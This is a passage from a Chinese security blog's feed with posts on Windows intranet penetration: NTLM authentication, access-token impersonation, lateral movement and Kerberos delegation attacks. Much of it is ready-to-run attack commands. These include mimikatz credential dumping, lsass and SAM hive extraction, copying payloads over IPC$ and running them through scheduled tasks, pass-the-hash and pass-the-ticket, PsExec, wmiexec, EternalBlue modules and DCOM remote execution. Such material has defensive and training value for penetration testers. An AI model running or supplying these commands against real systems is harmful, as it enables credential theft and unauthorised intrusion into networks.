&lt;p&gt;内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式，没有信托机构。&lt;/p&gt;
&lt;p&gt;网络认证则是基于一种 Challenge/Response 认证机制(&lt;strong&gt;NTLM 协议&lt;/strong&gt;)的认证模式。例如 SMB 文件共享。&lt;/p&gt;
&lt;h3 id=&#34;流程-1&#34;&gt;流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;协商：主要用于确认双方协议版本、加密等级等。&lt;/li&gt;
&lt;li&gt;质询
&lt;ul&gt;
&lt;li&gt;客户端向服务器端发送用户信息(用户名)。&lt;/li&gt;
&lt;li&gt;服务器收到请求，生成 &lt;strong&gt;16 位随机数&lt;/strong&gt;，称之为&amp;quot;Challenge&amp;quot;，随后使用登录用户名对应的 NTLM hash 加密 Challenge，得到 Challenge1。将 Challenge 发送给客户端。&lt;/li&gt;
&lt;li&gt;客户端得到 Challenge 后，使用登录账户的 NTLM hash 加密 Challenge 得到 Response，随后将Response 发送给服务端。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;验证：服务端校验收到的 Response 是否与 Chanllenge1 相等，相等则认证通过。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 462; 
			flex-basis: 1110px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314193038084.png&#34; data-size=&#34;1161x251&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314193038084.png&#34;
			width=&#34;1161&#34;
			height=&#34;251&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314193038084_hu1be0987448aea897ecff590ac33943a9_128787_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-12/image-20220314193038084_hu1be0987448aea897ecff590ac33943a9_128787_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;ntlm-v1-和-v2-区别&#34;&gt;NTLM v1 和 v2 区别&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;NTLM v1 的 Challenge 有 &lt;code&gt;8&lt;/code&gt; 位，NTLM v2 的 Challenge 为 &lt;code&gt;16&lt;/code&gt; 位&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NTLM v1 的主要加密算法是 &lt;code&gt;DES&lt;/code&gt;，NTLM v2 的主要加密算法是 &lt;code&gt;HMAC-MD5&lt;/code&gt;(实际实现下，可能使用更好的算法)。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows-access-token&#34;&gt;Windows Access Token&lt;/h2&gt;
&lt;h3 id=&#34;简介&#34;&gt;简介&lt;/h3&gt;
&lt;p&gt;Windows Token，也叫Access Token(访问令牌)，它是一个描述&lt;strong&gt;进程或者线程安全上下文&lt;/strong&gt;的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个 Token 在用户创建进程或者线程时会被使用，并不断拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。&lt;/p&gt;
&lt;h3 id=&#34;种类&#34;&gt;种类&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)&lt;/li&gt;
&lt;li&gt;Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的 Access Token。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当用户注销，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Access Token 的组成：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户帐户的安全标识符(SID)&lt;/li&gt;
&lt;li&gt;用户所属的组的SID&lt;/li&gt;
&lt;li&gt;用于标识当前登录会话的登录SID&lt;/li&gt;
&lt;li&gt;用户或用户组所拥有的权限列表&lt;/li&gt;
&lt;li&gt;所有者SID&lt;/li&gt;
&lt;li&gt;主要组的SID&lt;/li&gt;
&lt;li&gt;访问控制列表&lt;/li&gt;
&lt;li&gt;访问令牌的来源&lt;/li&gt;
&lt;li&gt;令牌是主要令牌还是模拟令牌&lt;/li&gt;
&lt;li&gt;限制SID的可选列表&lt;/li&gt;
&lt;li&gt;目前的模拟等级&lt;/li&gt;
&lt;li&gt;其他统计数据&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;产生&#34;&gt;产生&lt;/h3&gt;
&lt;p&gt;每个进程创建时都会根据登录会话权限由 LSA(Local Security Authority)分配一个 Token，如果CreaetProcess时自己指定了 Token, LSA 会使用该 Token， 否则就使用父进程 Token 的一份拷贝。&lt;/p&gt;
&lt;h3 id=&#34;令牌假冒&#34;&gt;令牌假冒&lt;/h3&gt;
&lt;p&gt;本质就是利用：用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cobalt Strike&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;steal_token
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;MSF&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
meterpreter &amp;gt; load incognito 
meterpreter &amp;gt; list_tokens –u
meterpreter &amp;gt; impersonate_token &amp;quot;PAYLOADS\\Administrator”
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>内网横向</title>
        <link>https://coollllllll.github.io/p/intranet-15/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-15/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-15/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 内网横向" /&gt;&lt;h1 id=&#34;内网横向&#34;&gt;内网横向&lt;/h1&gt;
&lt;h2 id=&#34;windows-密码与-hash-抓取&#34;&gt;Windows 密码与 Hash 抓取&lt;/h2&gt;
&lt;h3 id=&#34;mimikatz-直接读取明文密码&#34;&gt;mimikatz 直接读取明文密码&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
sekurlsa::logonpasswords
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;通过sam-和--system-文件抓取密码&#34;&gt;通过SAM 和  SYSTEM 文件抓取密码&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;导出SAM 和 SYSTEM文件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;reg save hklm\sam sam.hive
reg save hklm\system system.hive
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;mimikatz 离线读取文件获得 NTLM&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lsadump::sam /sam:sam.hive system:system.hive
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;在目标机器上直接读取本地SAM文件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
token::elevate
lsadump::sam
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;mimikatz-离线读取-lassdmp-文件&#34;&gt;mimikatz 离线读取 lass.dmp 文件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;使用Procdump(微软工具，免杀)工具导出 lass.dmp&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Procdump.exe -accepteula -ma lsass.exe lsass.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;使用 mimikatz 导出 lsass.dmp 文件中的密码值&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sekurlsa::mimidump lsass.dmp
sekurlsa::logonpasswords full
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;windows-远程连接&#34;&gt;Windows 远程连接&lt;/h2&gt;
&lt;h3 id=&#34;ipc&#34;&gt;IPC&lt;/h3&gt;
&lt;p&gt;IPC$(Internet Process Connection) 是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;建立 ipc$ 连接的条件：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标主机开启了139和445端口&lt;/li&gt;
&lt;li&gt;目标主机管理员开启了ipc$默认共享&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 通过账户:口令建立IPC
net use \\IP\ipc$ &amp;quot;password&amp;quot; /user:&amp;quot;username&amp;quot;

# 查看当前主机所建立的IPC
net use
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;建立IPC后，可以使用如下命令进行一些基本操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dir 命令&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 列出目标主机上的C盘
dir \\IP\c$
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;copy&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 复制恶意文件到目标C盘
copy C:\Users\douser\Desktop\shell.exe \\IP\c$
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;计划任务横向&#34;&gt;计划任务横向&lt;/h2&gt;
&lt;h3 id=&#34;at-命令&#34;&gt;at 命令&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;用于 Windows server 2008 之前版本&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;建立IPC&lt;/li&gt;
&lt;li&gt;查看目标当前时间&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net time \\IP
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;复制马到目标主机&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;k&#34;&gt;copy&lt;/span&gt; payload.bat \\IP\C$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;创建计划任务&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;at \\IP 7:00AM C:\payload.bat

# 执行完毕返回任务ID
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;上线之后，删除计划任务&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;at \\IP taskid /delete
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;schtakss-命令&#34;&gt;schtakss 命令&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;schtasks命令比at命令更为灵活、自由，用以代替at。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;建立IPC&lt;/li&gt;
&lt;li&gt;复制马到目标主机&lt;/li&gt;
&lt;li&gt;创建名为test的计划任务&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtask /create /s IP /tn test /sc minute /tr c:\payload.bat /ru system /f

# minute表明每分钟执行一次
# 创建失败，比如拒绝访问错误，就是权限不够，可以使用/u /p 参数附带高权限用户
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;等计划任务运行，上线&lt;/li&gt;
&lt;li&gt;也可以让其直接运行&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtasks /run /s ip /i /tn test

# 权限不够，附加用户和密码
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;上线后，删除计划任务&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtasks /delete /s ip /tn &amp;quot;test&amp;quot; /f
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;在使用schtasks命令时，会在系统中留下日志文件：C:\Windows\Tasks\SchedLgU.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;pth-攻击&#34;&gt;PTH 攻击&lt;/h2&gt;
&lt;h3 id=&#34;ntlm-hash-传递&#34;&gt;NTLM Hash 传递&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;aes-256-密钥进行哈希传递&#34;&gt;AES-256 密钥进行哈希传递&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;使用 mimikatz 抓取 AES-256 密钥&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::ekeys&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;pth攻击（目标机器安装 KB2871997）&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;票据传递&#34;&gt;票据传递&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基于ms14-068生成TGT&lt;/li&gt;
&lt;li&gt;使用mimikatz将票据注入内存&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::purge         
kerberos::list          
kerberos::ptt C:\xxx.kirbi 
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;访问域内其他主机&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;psexec&#34;&gt;psexec&lt;/h2&gt;
&lt;p&gt;psexec 是 windows 下非常好的一款远程命令行工具。属于微软官方，所以一般是免杀的。&lt;/p&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;通过ipc$连接，释放二进制文件psexecsvc.exe到目标&lt;/li&gt;
&lt;li&gt;通过服务管理SCManager远程创建一个psexec服务，并启动服务&lt;/li&gt;
&lt;li&gt;客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据&lt;/li&gt;
&lt;li&gt;运行结束后删除服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;条件&#34;&gt;条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名&lt;/li&gt;
&lt;li&gt;对方未开启防火墙&lt;/li&gt;
&lt;li&gt;如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问&lt;/li&gt;
&lt;li&gt;如果是域环境，连接普通域主机可以用普通域用户，连接域控只能用域管理员账户&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;使用&#34;&gt;使用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;建立IPC&lt;/li&gt;
&lt;li&gt;获取 System 权限的 交互式shell&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PsExec.exe -accepteula \\IP -s cmd.exe

# 直接执行命令
PsExec.exe -accepteula \\IP -s cmd.exe /c ipconfig

# 缺少-s将返回Administrator 权限的 shell
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;msf&#34;&gt;MSF&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exploit/windows/smb/psexec

exploit/windows/smb/psexec_psh（powershell 版本）
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;永恒之蓝&#34;&gt;永恒之蓝&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;auxiliary/scanner/smb/smb_ms17_010
auxiliary/admin/smb/ms17_010_command
exploit/windows/smb/ms17_010_eternalblue
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;wmi&#34;&gt;WMI&lt;/h2&gt;
&lt;h3 id=&#34;基本使用&#34;&gt;基本使用&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:IP /user:administrator /password:passed process call create &amp;quot;cmd.exe /c ipconfig &amp;gt; ip.txt&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;建立IPC，使用type命令读取结果&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;type \\IP\C$\ip.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;impacket-包中的-wmiexec&#34;&gt;impacket 包中的 wmiexec&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python wmiexec.py administrator:password@IP

# 如果没有密码，也可以配合哈希传递
wmiexec.py -hashes
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;smbexec&#34;&gt;smbexec&lt;/h2&gt;
&lt;h3 id=&#34;impacket-版&#34;&gt;impacket 版&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 smbexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;linux-跨平台-windows-远程命令执行&#34;&gt;Linux 跨平台 Windows 远程命令执行&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/brav0hax/smbexec&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/brav0hax/smbexec&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;dcom&#34;&gt;DCOM&lt;/h2&gt;
&lt;p&gt;DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。&lt;/p&gt;
&lt;h3 id=&#34;本地执行任意命令&#34;&gt;本地执行任意命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;获取 DCOM 程序列表&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# windows server 2012 及以上
Get-CimInstance Win32_DCOMApplicatioon

# Windows 7、Windows Server 2008
Get-WmicObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;执行任意命令&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 本地管理员powershell下执行
[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;127.0.0.1&amp;quot;)).Document.ActiveView.ExecuteShellCommand(&amp;quot;cmd.exe&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;Minimzed&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;远程主机上执行命令&#34;&gt;远程主机上执行命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;IPC连接&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\IP &amp;quot;password&amp;quot; /user:pentest.hacker\win7user
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;执行命令&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 调用 MMC20_Application 远程执行命令
$com=[Activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;IP&amp;quot;))
$com.Document.ActiveView.ExecuteShellCommand(&amp;quot;cmd.exe&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;Minimzed&amp;quot;)


# 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39
$com=[Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&amp;quot;IP&amp;quot;)
$obj=[System.Activator]::CreateInstance($com)
$item=$obj.item()
$item.Document.Application.ShellExecute(&amp;quot;cmd.exe&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;c:\windows\system32&amp;quot;,&amp;quot;$null&amp;quot;,0)
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>基于域委派的攻击</title>
        <link>https://coollllllll.github.io/p/intranet-13/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-13/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 基于域委派的攻击" /&gt;&lt;h1 id=&#34;基于域委派的攻击&#34;&gt;基于域委派的攻击&lt;/h1&gt;
&lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
&lt;h3 id=&#34;委派&#34;&gt;委派&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Identity delegation is a feature of Active Directo ry Federation Services (AD FS) that allows administrator-specified accounts to impersonate users. The account that impersonates the user is called the dele gate

This delegation capability is critical for many distributed applications for which there is a series of access control checks that must be made sequentially for each application, database, or service that is in the authorization chain for the originating request

Many real-world scenarios exist in which a Web application “front end” must retrieve data from a more secure “back end”, such as a Web service that is connected to a Microsoft SQL Server database.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门。&lt;/p&gt;
&lt;p&gt;域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。&lt;/p&gt;
&lt;p&gt;服务账号(&lt;code&gt;Service Account&lt;/code&gt;)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 &lt;code&gt;MS SQL Server&lt;/code&gt; 在安装时，会在域内自动注册服务账号 &lt;code&gt;SqlServiceAccount&lt;/code&gt;，这类账号不能用于交互式登录。&lt;/p&gt;
&lt;h3 id=&#34;多跳认证和委派的流程&#34;&gt;多跳认证和委派的流程&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;多跳认证示意图：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 181; 
			flex-basis: 435px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312232633308.png&#34; data-size=&#34;970x535&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312232633308.png&#34;
			width=&#34;970&#34;
			height=&#34;535&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312232633308_hu205c284eaaaf866791cc70363f1279ae_120151_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220312232633308_hu205c284eaaaf866791cc70363f1279ae_120151_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;流程：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;域内用户 jack 以 Kerberos 方式认证后(先向 DS 进行常规的 kerberos 认证，获取 Web 服务器的访问权限)访问 Web 服务器&lt;/li&gt;
&lt;li&gt;Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请&lt;/li&gt;
&lt;li&gt;KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT&lt;/li&gt;
&lt;li&gt;websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 TGS&lt;/li&gt;
&lt;li&gt;KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 TGS&lt;/li&gt;
&lt;li&gt;websvc 收到的 jack 用户的授权票据 TGS 后，可访问文件服务，完成多跳认证。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;委派分类&#34;&gt;委派分类&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;非约束委派(Unconstrained Delegation)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户访问任意服务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;约束性委派(Constrained Delegation)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Kerberos 的扩展协议 &lt;code&gt;S4U2Proxy&lt;/code&gt;，服务账号只能获取某用户的 &lt;code&gt;TGS&lt;/code&gt;，从而只能模拟用户访问特定的服务。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 85; 
			flex-basis: 205px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312234816265.png&#34; data-size=&#34;767x897&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312234816265.png&#34;
			width=&#34;767&#34;
			height=&#34;897&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220312234816265_hu710bf613b72f134f0414698af399a466_469742_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220312234816265_hu710bf613b72f134f0414698af399a466_469742_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;非约束委派&#34;&gt;非约束委派&lt;/h2&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 129; 
			flex-basis: 311px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313152035356.png&#34; data-size=&#34;800x616&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313152035356.png&#34;
			width=&#34;800&#34;
			height=&#34;616&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313152035356_hu8c8d8d8693b456944a0031f2c14ad610_228297_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313152035356_hu8c8d8d8693b456944a0031f2c14ad610_228297_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当 &lt;code&gt;user&lt;/code&gt; 访问 &lt;code&gt;service1&lt;/code&gt; 时，如果 &lt;code&gt;service1&lt;/code&gt; 的服务账号开启了 &lt;code&gt;unconstrained delegation&lt;/code&gt;（非约束委派），则当 &lt;code&gt;user&lt;/code&gt; 访问 &lt;code&gt;service1&lt;/code&gt; 时会将 &lt;code&gt;user&lt;/code&gt; 的 &lt;code&gt;TGT&lt;/code&gt; 发送给 &lt;code&gt;service1&lt;/code&gt; 并保存在内存中以备下次重用，然后 &lt;code&gt;service1&lt;/code&gt; 就可以利用这张&lt;code&gt;TGT&lt;/code&gt; 以 &lt;code&gt;user&lt;/code&gt;的身份去访问域内的任何服务（任何服务是指&lt;code&gt;user&lt;/code&gt;能访问的服务）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;流程如下：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户向KDC请求可转发TGT，记为TGT1&lt;/li&gt;
&lt;li&gt;KDC返回TGT1&lt;/li&gt;
&lt;li&gt;用户通过TGT1向KDC请求转发TGT2&lt;/li&gt;
&lt;li&gt;KDC返回TGT2&lt;/li&gt;
&lt;li&gt;用户通过TGT1向KDC申请访问服务1的TGS&lt;/li&gt;
&lt;li&gt;KDC返回TGS&lt;/li&gt;
